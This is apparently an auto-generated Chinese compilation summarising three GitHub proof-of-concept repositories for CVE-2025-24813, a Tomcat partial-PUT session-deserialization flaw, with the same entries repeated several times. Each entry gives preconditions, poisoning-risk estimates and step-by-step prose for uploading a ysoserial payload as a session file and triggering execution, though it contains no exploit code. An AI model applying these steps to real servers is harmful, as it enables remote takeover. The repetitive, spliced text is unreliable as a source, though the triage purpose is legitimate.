   *   然后，攻击者可以通过PUT请求上传恶意的Session文件覆盖原有的Session文件。
   *   当Tomcat反序列化恶意Session文件时，即可触发RCE。

总结：利用此漏洞的关键在于找到可写目录，并根据应用环境选择合适的payload（例如恶意的session对象）进行上传。

**项目地址:** [x00byte/PutScanner](https://github.com/x00byte/PutScanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #51

**来源**: [CVE-2025-24813-x1ongsec_CVE-2025-24813.md](../2025/CVE-2025-24813-x1ongsec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足以下全部条件：1. DefaultServlet 写入功能已启用 (默认关闭)；2. 支持 partial PUT 请求 (默认开启)；3. 使用 Tomcat 文件会话持久化和默认存储位置；4. 应用包含存在反序列化漏洞的库。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以通过 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。利用此漏洞需要DefaultServlet开启写入，支持partial PUT，且应用使用了Tomcat的文件会话保持，并包含可被利用的反序列化库。提供的POC首先上传包含恶意序列化数据的分块文件到会话文件存储位置，然后通过访问触发反序列化。

**漏洞利用方式：**

1.  **前提条件检查：** 确保目标Tomcat实例满足漏洞利用的全部条件，包括DefaultServlet启用写入，支持partial PUT，使用了默认的文件会话存储位置，以及包含可利用的反序列化库。
2.  **会话ID获取：** 访问Tomcat应用获取JSESSIONID Cookie，用于后续的会话文件操作。
3.  **恶意序列化数据准备：** 构造包含恶意代码的序列化对象，该对象利用目标应用中的反序列化漏洞执行任意代码。
4.  **分块上传恶意数据：** 使用PUT请求，通过Content-Range头部指定分块大小，将恶意序列化数据分块上传到Tomcat的会话文件存储位置，文件名通常与JSESSIONID相关。
5.  **触发反序列化：** 通过发送包含特定JSESSIONID Cookie的GET请求或其他HTTP请求，触发Tomcat加载和反序列化之前上传的恶意会话文件，从而执行恶意代码。

**投毒风险分析：**

该仓库主要提供复现环境和PoC，本身的代码较为简单，但存在一定的投毒风险：
* **复现环境配置修改：** 作者为了方便漏洞复现，提供的环境配置可能包含潜在的安全风险，例如，默认开启了DefaultServlet的写入功能，这本身就是一个不安全的配置。
* **恶意序列化数据构造：** PoC的关键在于恶意序列化数据的构造，攻击者可能在构造过程中引入隐藏的后门代码，例如，通过ClassLoader加载远程恶意类，从而实现更隐蔽的远程代码执行。PoC中需要自行构造反序列化文件内容，作者可能并未提供完整的反序列化利用链，需要自行寻找或构造，存在一定门槛，因此投毒的概率较低，估计在20%左右。

总的来说，该漏洞利用的有效性取决于目标环境的配置和应用依赖，利用方式相对复杂，需要一定的技术积累。虽然该复现环境主要用于学习研究，但依然存在一定的投毒风险，需要谨慎使用。

**项目地址:** [x1ongsec/CVE-2025-24813](https://github.com/x1ongsec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #52

**来源**: [CVE-2025-24813-yaleman_cve-2025-24813-poc.md](../2025/CVE-2025-24813-yaleman_cve-2025-24813-poc.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT (enabled by default), application uses Tomcat's file based session persistence with default storage location, application includes a library that may be leveraged in a deserialization attack

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者通过具有写权限的默认 Servlet 执行远程代码或进行信息泄露。漏洞利用的关键在于 Tomcat 的 partial PUT 功能和文件型 session 持久化机制。 

**有效性分析：**

根据漏洞描述和搜索结果，该漏洞利用依赖于几个前提条件：

1.  默认 Servlet 必须启用写入权限（默认禁用，需要配置）。
2.  必须支持 partial PUT （默认启用）。
3.  应用程序必须使用 Tomcat 的文件型 session 持久化，且使用默认存储位置。
4.  应用程序需要包含一个可用于反序列化攻击的库（例如，存在已知的 ysoserial gadget）。

提供的 PoC 代码（main.py）尝试模拟这些步骤：

1.  检查目标 Servlet 是否可通过 PUT 请求写入。
2.  生成恶意的 Java 序列化 payload （通过 ysoserial）。
3.  上传 payload 作为 session 文件。
4.  通过访问 session 文件触发反序列化。

搜索结果表明，CVE-2025-24813 漏洞在野外已被积极利用。 多个博客文章 (rapid7, recordedfuture, akamai, keysight, wiz, zscaler, sonicwall, xmcyber) 都描述了该漏洞以及检测和缓解方法。

**投毒风险分析：**

分析提供的PoC代码，存在一定的投毒风险，约为10%：

*   `download.sh` 脚本会从外部源（`https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar`）下载 `ysoserial-all.jar`。虽然 ysoserial 是一个合法的漏洞利用工具，但下载过程中存在被中间人攻击或恶意软件替换的风险。该脚本在下载后会检查文件是否为有效的 JAR 文件，但不能完全保证其安全性。
*   `main.py`  脚本尝试通过PUT请求写入文件，可能会写入恶意代码或后门。虽然脚本主要目的是RCE，但存在修改文件内容的潜在风险。

总体而言，PoC 本身主要是为了演示漏洞，但从外部源下载 ysoserial 存在一定的风险。使用者应谨慎对待。

**利用方式：**

1.  **检查可写性:** 首先，确定目标 Tomcat 服务器上的默认 Servlet 是否启用了写入权限，并且支持 partial PUT 请求。
2.  **生成 Payload:**  使用 ysoserial 或其他工具，根据目标应用程序中存在的库，生成一个恶意的 Java 序列化 Payload，该 Payload 包含要执行的命令。
3.  **上传 Payload:**  将生成的 Payload 通过 PUT 请求上传到 Tomcat 服务器，利用 partial PUT 功能将 Payload 写入到 session 文件中。
4.  **触发反序列化:**  通过构造特定的 HTTP 请求，访问包含恶意 Payload 的 session 文件，触发 Java 反序列化漏洞，从而执行 Payload 中的命令。

该漏洞允许攻击者在目标服务器上执行任意代码，从而完全控制系统。如果无法直接执行代码，攻击者还可以利用该漏洞进行信息泄露，读取敏感文件，或者修改服务器上的文件。

**项目地址:** [yaleman/cve-2025-24813-poc](https://github.com/yaleman/cve-2025-24813-poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---



---

## POC #50

**来源**: [CVE-2025-24813-x00byte_PutScanner.md](../2025/CVE-2025-24813-x00byte_PutScanner.md)

## CVE-2025-24813-Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. 可能需要应用程序使用Tomcat基于文件的会话持久化，且使用默认存储位置
4. 可能需要应用程序包含一个可以被反序列化攻击利用的库。
5. 对于信息泄露，目标URL要是公共上传URL的子目录。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，源于对包含内部点（例如 file.Name）的文件路径处理不当。如果满足特定条件，攻击者可能利用此漏洞执行远程代码或泄露敏感信息。

**有效性：**
根据漏洞描述和搜索结果，此漏洞的利用需要满足多个前提条件，包括启用默认servlet的写入功能，支持部分PUT请求，以及应用程序特定的配置或依赖。提供的POC代码是一个目录扫描器，用于查找可使用PUT方法写入的目录，是漏洞利用的前期步骤，本身并不能直接触发RCE或者信息泄露，需要进一步利用PUT上传恶意文件覆盖session或者其他敏感文件才能达到目的。综合搜索结果，此漏洞确实存在利用实例。

**投毒风险：**
查看代码，该POC主要用于扫描目标服务器上的可写目录，并不会主动上传后门代码。投毒风险主要来自于使用者在找到可写目录后，自行构造恶意payload上传，并非POC本身包含恶意代码。 `PutScanner` 仓库中的投毒风险较低，主要风险在于使用者利用该工具扫描后进行恶意操作，因此我估计的投毒风险为5%。

**利用方式：**
1.  **扫描可写目录：** 使用`putscanner.py`扫描目标Tomcat服务器，寻找可以使用HTTP PUT方法写入的目录。
2.  **信息泄露：** 如果启用了默认Servlet的写入功能，支持部分PUT请求，且攻击者已知安全敏感文件的名称并能通过部分PUT上传，则可能读取或修改这些文件。
3.  **远程代码执行 (RCE):**  如果启用了默认Servlet的写入功能，支持部分PUT请求，应用使用了Tomcat的文件会话持久化机制，且应用包含可被反序列化攻击的库，攻击者可以通过上传包含恶意序列化对象的会话文件来执行任意代码。
   *   攻击者首先需要找到Tomcat用于存储Session的文件目录 (默认在`$CATALINA_BASE/work/Catalina/localhost/[appname]/SESSIONS.ser`)。
   *   然后，攻击者可以通过PUT请求上传恶意的Session文件覆盖原有的Session文件。
   *   当Tomcat反序列化恶意Session文件时，即可触发RCE。

总结：利用此漏洞的关键在于找到可写目录，并根据应用环境选择合适的payload（例如恶意的session对象）进行上传。

**项目地址:** [x00byte/PutScanner](https://github.com/x00byte/PutScanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #51

**来源**: [CVE-2025-24813-x1ongsec_CVE-2025-24813.md](../2025/CVE-2025-24813-x1ongsec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足以下全部条件：1. DefaultServlet 写入功能已启用 (默认关闭)；2. 支持 partial PUT 请求 (默认开启)；3. 使用 Tomcat 文件会话持久化和默认存储位置；4. 应用包含存在反序列化漏洞的库。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以通过 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。利用此漏洞需要DefaultServlet开启写入，支持partial PUT，且应用使用了Tomcat的文件会话保持，并包含可被利用的反序列化库。提供的POC首先上传包含恶意序列化数据的分块文件到会话文件存储位置，然后通过访问触发反序列化。

**漏洞利用方式：**

1.  **前提条件检查：** 确保目标Tomcat实例满足漏洞利用的全部条件，包括DefaultServlet启用写入，支持partial PUT，使用了默认的文件会话存储位置，以及包含可利用的反序列化库。
2.  **会话ID获取：** 访问Tomcat应用获取JSESSIONID Cookie，用于后续的会话文件操作。
3.  **恶意序列化数据准备：** 构造包含恶意代码的序列化对象，该对象利用目标应用中的反序列化漏洞执行任意代码。
4.  **分块上传恶意数据：** 使用PUT请求，通过Content-Range头部指定分块大小，将恶意序列化数据分块上传到Tomcat的会话文件存储位置，文件名通常与JSESSIONID相关。
5.  **触发反序列化：** 通过发送包含特定JSESSIONID Cookie的GET请求或其他HTTP请求，触发Tomcat加载和反序列化之前上传的恶意会话文件，从而执行恶意代码。

**投毒风险分析：**

该仓库主要提供复现环境和PoC，本身的代码较为简单，但存在一定的投毒风险：
* **复现环境配置修改：** 作者为了方便漏洞复现，提供的环境配置可能包含潜在的安全风险，例如，默认开启了DefaultServlet的写入功能，这本身就是一个不安全的配置。
* **恶意序列化数据构造：** PoC的关键在于恶意序列化数据的构造，攻击者可能在构造过程中引入隐藏的后门代码，例如，通过ClassLoader加载远程恶意类，从而实现更隐蔽的远程代码执行。PoC中需要自行构造反序列化文件内容，作者可能并未提供完整的反序列化利用链，需要自行寻找或构造，存在一定门槛，因此投毒的概率较低，估计在20%左右。

总的来说，该漏洞利用的有效性取决于目标环境的配置和应用依赖，利用方式相对复杂，需要一定的技术积累。虽然该复现环境主要用于学习研究，但依然存在一定的投毒风险，需要谨慎使用。

**项目地址:** [x1ongsec/CVE-2025-24813](https://github.com/x1ongsec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #52

**来源**: [CVE-2025-24813-yaleman_cve-2025-24813-poc.md](../2025/CVE-2025-24813-yaleman_cve-2025-24813-poc.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT (enabled by default), application uses Tomcat's file based session persistence with default storage location, application includes a library that may be leveraged in a deserialization attack

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者通过具有写权限的默认 Servlet 执行远程代码或进行信息泄露。漏洞利用的关键在于 Tomcat 的 partial PUT 功能和文件型 session 持久化机制。 

**有效性分析：**

根据漏洞描述和搜索结果，该漏洞利用依赖于几个前提条件：

1.  默认 Servlet 必须启用写入权限（默认禁用，需要配置）。
2.  必须支持 partial PUT （默认启用）。
3.  应用程序必须使用 Tomcat 的文件型 session 持久化，且使用默认存储位置。
4.  应用程序需要包含一个可用于反序列化攻击的库（例如，存在已知的 ysoserial gadget）。

提供的 PoC 代码（main.py）尝试模拟这些步骤：

1.  检查目标 Servlet 是否可通过 PUT 请求写入。
2.  生成恶意的 Java 序列化 payload （通过 ysoserial）。
3.  上传 payload 作为 session 文件。
4.  通过访问 session 文件触发反序列化。

搜索结果表明，CVE-2025-24813 漏洞在野外已被积极利用。 多个博客文章 (rapid7, recordedfuture, akamai, keysight, wiz, zscaler, sonicwall, xmcyber) 都描述了该漏洞以及检测和缓解方法。

**投毒风险分析：**

分析提供的PoC代码，存在一定的投毒风险，约为10%：

*   `download.sh` 脚本会从外部源（`https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar`）下载 `ysoserial-all.jar`。虽然 ysoserial 是一个合法的漏洞利用工具，但下载过程中存在被中间人攻击或恶意软件替换的风险。该脚本在下载后会检查文件是否为有效的 JAR 文件，但不能完全保证其安全性。
*   `main.py`  脚本尝试通过PUT请求写入文件，可能会写入恶意代码或后门。虽然脚本主要目的是RCE，但存在修改文件内容的潜在风险。

总体而言，PoC 本身主要是为了演示漏洞，但从外部源下载 ysoserial 存在一定的风险。使用者应谨慎对待。

**利用方式：**

1.  **检查可写性:** 首先，确定目标 Tomcat 服务器上的默认 Servlet 是否启用了写入权限，并且支持 partial PUT 请求。
2.  **生成 Payload:**  使用 ysoserial 或其他工具，根据目标应用程序中存在的库，生成一个恶意的 Java 序列化 Payload，该 Payload 包含要执行的命令。
3.  **上传 Payload:**  将生成的 Payload 通过 PUT 请求上传到 Tomcat 服务器，利用 partial PUT 功能将 Payload 写入到 session 文件中。
4.  **触发反序列化:**  通过构造特定的 HTTP 请求，访问包含恶意 Payload 的 session 文件，触发 Java 反序列化漏洞，从而执行 Payload 中的命令。

该漏洞允许攻击者在目标服务器上执行任意代码，从而完全控制系统。如果无法直接执行代码，攻击者还可以利用该漏洞进行信息泄露，读取敏感文件，或者修改服务器上的文件。

**项目地址:** [yaleman/cve-2025-24813-poc](https://github.com/yaleman/cve-2025-24813-poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---



---

## POC #50

**来源**: [CVE-2025-24813-x00byte_PutScanner.md](../2025/CVE-2025-24813-x00byte_PutScanner.md)

## CVE-2025-24813-Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. 可能需要应用程序使用Tomcat基于文件的会话持久化，且使用默认存储位置
4. 可能需要应用程序包含一个可以被反序列化攻击利用的库。
5. 对于信息泄露，目标URL要是公共上传URL的子目录。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，源于对包含内部点（例如 file.Name）的文件路径处理不当。如果满足特定条件，攻击者可能利用此漏洞执行远程代码或泄露敏感信息。

**有效性：**
根据漏洞描述和搜索结果，此漏洞的利用需要满足多个前提条件，包括启用默认servlet的写入功能，支持部分PUT请求，以及应用程序特定的配置或依赖。提供的POC代码是一个目录扫描器，用于查找可使用PUT方法写入的目录，是漏洞利用的前期步骤，本身并不能直接触发RCE或者信息泄露，需要进一步利用PUT上传恶意文件覆盖session或者其他敏感文件才能达到目的。综合搜索结果，此漏洞确实存在利用实例。

**投毒风险：**
查看代码，该POC主要用于扫描目标服务器上的可写目录，并不会主动上传后门代码。投毒风险主要来自于使用者在找到可写目录后，自行构造恶意payload上传，并非POC本身包含恶意代码。 `PutScanner` 仓库中的投毒风险较低，主要风险在于使用者利用该工具扫描后进行恶意操作，因此我估计的投毒风险为5%。

**利用方式：**
1.  **扫描可写目录：** 使用`putscanner.py`扫描目标Tomcat服务器，寻找可以使用HTTP PUT方法写入的目录。
2.  **信息泄露：** 如果启用了默认Servlet的写入功能，支持部分PUT请求，且攻击者已知安全敏感文件的名称并能通过部分PUT上传，则可能读取或修改这些文件。
3.  **远程代码执行 (RCE):**  如果启用了默认Servlet的写入功能，支持部分PUT请求，应用使用了Tomcat的文件会话持久化机制，且应用包含可被反序列化攻击的库，攻击者可以通过上传包含恶意序列化对象的会话文件来执行任意代码。
   *   攻击者首先需要找到Tomcat用于存储Session的文件目录 (默认在`$CATALINA_BASE/work/Catalina/localhost/[appname]/SESSIONS.ser`)。
   *   然后，攻击者可以通过PUT请求上传恶意的Session文件覆盖原有的Session文件。
   *   当Tomcat反序列化恶意Session文件时，即可触发RCE。

总结：利用此漏洞的关键在于找到可写目录，并根据应用环境选择合适的payload（例如恶意的session对象）进行上传。

**项目地址:** [x00byte/PutScanner](https://github.com/x00byte/PutScanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #51

**来源**: [CVE-2025-24813-x1ongsec_CVE-2025-24813.md](../2025/CVE-2025-24813-x1ongsec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足以下全部条件：1. DefaultServlet 写入功能已启用 (默认关闭)；2. 支持 partial PUT 请求 (默认开启)；3. 使用 Tomcat 文件会话持久化和默认存储位置；4. 应用包含存在反序列化漏洞的库。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以通过 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。利用此漏洞需要DefaultServlet开启写入，支持partial PUT，且应用使用了Tomcat的文件会话保持，并包含可被利用的反序列化库。提供的POC首先上传包含恶意序列化数据的分块文件到会话文件存储位置，然后通过访问触发反序列化。

**漏洞利用方式：**

1.  **前提条件检查：** 确保目标Tomcat实例满足漏洞利用的全部条件，包括DefaultServlet启用写入，支持partial PUT，使用了默认的文件会话存储位置，以及包含可利用的反序列化库。
2.  **会话ID获取：** 访问Tomcat应用获取JSESSIONID Cookie，用于后续的会话文件操作。
3.  **恶意序列化数据准备：** 构造包含恶意代码的序列化对象，该对象利用目标应用中的反序列化漏洞执行任意代码。
4.  **分块上传恶意数据：** 使用PUT请求，通过Content-Range头部指定分块大小，将恶意序列化数据分块上传到Tomcat的会话文件存储位置，文件名通常与JSESSIONID相关。
5.  **触发反序列化：** 通过发送包含特定JSESSIONID Cookie的GET请求或其他HTTP请求，触发Tomcat加载和反序列化之前上传的恶意会话文件，从而执行恶意代码。

**投毒风险分析：**

该仓库主要提供复现环境和PoC，本身的代码较为简单，但存在一定的投毒风险：
* **复现环境配置修改：** 作者为了方便漏洞复现，提供的环境配置可能包含潜在的安全风险，例如，默认开启了DefaultServlet的写入功能，这本身就是一个不安全的配置。
* **恶意序列化数据构造：** PoC的关键在于恶意序列化数据的构造，攻击者可能在构造过程中引入隐藏的后门代码，例如，通过ClassLoader加载远程恶意类，从而实现更隐蔽的远程代码执行。PoC中需要自行构造反序列化文件内容，作者可能并未提供完整的反序列化利用链，需要自行寻找或构造，存在一定门槛，因此投毒的概率较低，估计在20%左右。

总的来说，该漏洞利用的有效性取决于目标环境的配置和应用依赖，利用方式相对复杂，需要一定的技术积累。虽然该复现环境主要用于学习研究，但依然存在一定的投毒风险，需要谨慎使用。

**项目地址:** [x1ongsec/CVE-2025-24813](https://github.com/x1ongsec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #52

**来源**: [CVE-2025-24813-yaleman_cve-2025-24813-poc.md](../2025/CVE-2025-24813-yaleman_cve-2025-24813-poc.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT (enabled by default), application uses Tomcat's file based session persistence with default storage location, application includes a library that may be leveraged in a deserialization attack

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者通过具有写权限的默认 Servlet 执行远程代码或进行信息泄露。漏洞利用的关键在于 Tomcat 的 partial PUT 功能和文件型 session 持久化机制。 

**有效性分析：**

根据漏洞描述和搜索结果，该漏洞利用依赖于几个前提条件：

1.  默认 Servlet 必须启用写入权限（默认禁用，需要配置）。
2.  必须支持 partial PUT （默认启用）。
3.  应用程序必须使用 Tomcat 的文件型 session 持久化，且使用默认存储位置。
4.  应用程序需要包含一个可用于反序列化攻击的库（例如，存在已知的 ysoserial gadget）。

提供的 PoC 代码（main.py）尝试模拟这些步骤：

1.  检查目标 Servlet 是否可通过 PUT 请求写入。
2.  生成恶意的 Java 序列化 payload （通过 ysoserial）。
3.  上传 payload 作为 session 文件。
4.  通过访问 session 文件触发反序列化。

搜索结果表明，CVE-2025-24813 漏洞在野外已被积极利用。 多个博客文章 (rapid7, recordedfuture, akamai, keysight, wiz, zscaler, sonicwall, xmcyber) 都描述了该漏洞以及检测和缓解方法。

**投毒风险分析：**

分析提供的PoC代码，存在一定的投毒风险，约为10%：

*   `download.sh` 脚本会从外部源（`https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar`）下载 `ysoserial-all.jar`。虽然 ysoserial 是一个合法的漏洞利用工具，但下载过程中存在被中间人攻击或恶意软件替换的风险。该脚本在下载后会检查文件是否为有效的 JAR 文件，但不能完全保证其安全性。
*   `main.py`  脚本尝试通过PUT请求写入文件，可能会写入恶意代码或后门。虽然脚本主要目的是RCE，但存在修改文件内容的潜在风险。

总体而言，PoC 本身主要是为了演示漏洞，但从外部源下载 ysoserial 存在一定的风险。使用者应谨慎对待。

**利用方式：**

1.  **检查可写性:** 首先，确定目标 Tomcat 服务器上的默认 Servlet 是否启用了写入权限，并且支持 partial PUT 请求。
2.  **生成 Payload:**  使用 ysoserial 或其他工具，根据目标应用程序中存在的库，生成一个恶意的 Java 序列化 Payload，该 Payload 包含要执行的命令。
3.  **上传 Payload:**  将生成的 Payload 通过 PUT 请求上传到 Tomcat 服务器，利用 partial PUT 功能将 Payload 写入到 session 文件中。
4.  **触发反序列化:**  通过构造特定的 HTTP 请求，访问包含恶意 Payload 的 session 文件，触发 Java 反序列化漏洞，从而执行 Payload 中的命令。

该漏洞允许攻击者在目标服务器上执行任意代码，从而完全控制系统。如果无法直接执行代码，攻击者还可以利用该漏洞进行信息泄露，读取敏感文件，或者修改服务器上的文件。

**项目地址:** [yaleman/cve-2025-24813-poc](https://github.com/yaleman/cve-2025-24813-poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---



---

## POC #50

**来源**: [CVE-2025-24813-x00byte_PutScanner.md](../2025/CVE-2025-24813-x00byte_PutScanner.md)

## CVE-2025-24813-Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. 可能需要应用程序使用Tomcat基于文件的会话持久化，且使用默认存储位置
4. 可能需要应用程序包含一个可以被反序列化攻击利用的库。
5. 对于信息泄露，目标URL要是公共上传URL的子目录。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，源于对包含内部点（例如 file.Name）的文件路径处理不当。如果满足特定条件，攻击者可能利用此漏洞执行远程代码或泄露敏感信息。

**有效性：**
根据漏洞描述和搜索结果，此漏洞的利用需要满足多个前提条件，包括启用默认servlet的写入功能，支持部分PUT请求，以及应用程序特定的配置或依赖。提供的POC代码是一个目录扫描器，用于查找可使用PUT方法写入的目录，是漏洞利用的前期步骤，本身并不能直接触发RCE或者信息泄露，需要进一步利用PUT上传恶意文件覆盖session或者其他敏感文件才能达到目的。综合搜索结果，此漏洞确实存在利用实例。

**投毒风险：**
查看代码，该POC主要用于扫描目标服务器上的可写目录，并不会主动上传后门代码。投毒风险主要来自于使用者在找到可写目录后，自行构造恶意payload上传，并非POC本身包含恶意代码。 `PutScanner` 仓库中的投毒风险较低，主要风险在于使用者利用该工具扫描后进行恶意操作，因此我估计的投毒风险为5%。

**利用方式：**
1.  **扫描可写目录：** 使用`putscanner.py`扫描目标Tomcat服务器，寻找可以使用HTTP PUT方法写入的目录。
2.  **信息泄露：** 如果启用了默认Servlet的写入功能，支持部分PUT请求，且攻击者已知安全敏感文件的名称并能通过部分PUT上传，则可能读取或修改这些文件。
3.  **远程代码执行 (RCE):**  如果启用了默认Servlet的写入功能，支持部分PUT请求，应用使用了Tomcat的文件会话持久化机制，且应用包含可被反序列化攻击的库，攻击者可以通过上传包含恶意序列化对象的会话文件来执行任意代码。
   *   攻击者首先需要找到Tomcat用于存储Session的文件目录 (默认在`$CATALINA_BASE/work/Catalina/localhost/[appname]/SESSIONS.ser`)。
   *   然后，攻击者可以通过PUT请求上传恶意的Session文件覆盖原有的Session文件。
   *   当Tomcat反序列化恶意Session文件时，即可触发RCE。

总结：利用此漏洞的关键在于找到可写目录，并根据应用环境选择合适的payload（例如恶意的session对象）进行上传。

**项目地址:** [x00byte/PutScanner](https://github.com/x00byte/PutScanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #51

**来源**: [CVE-2025-24813-x1ongsec_CVE-2025-24813.md](../2025/CVE-2025-24813-x1ongsec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足以下全部条件：1. DefaultServlet 写入功能已启用 (默认关闭)；2. 支持 partial PUT 请求 (默认开启)；3. 使用 Tomcat 文件会话持久化和默认存储位置；4. 应用包含存在反序列化漏洞的库。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以通过 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。利用此漏洞需要DefaultServlet开启写入，支持partial PUT，且应用使用了Tomcat的文件会话保持，并包含可被利用的反序列化库。提供的POC首先上传包含恶意序列化数据的分块文件到会话文件存储位置，然后通过访问触发反序列化。

**漏洞利用方式：**

1.  **前提条件检查：** 确保目标Tomcat实例满足漏洞利用的全部条件，包括DefaultServlet启用写入，支持partial PUT，使用了默认的文件会话存储位置，以及包含可利用的反序列化库。
2.  **会话ID获取：** 访问Tomcat应用获取JSESSIONID Cookie，用于后续的会话文件操作。
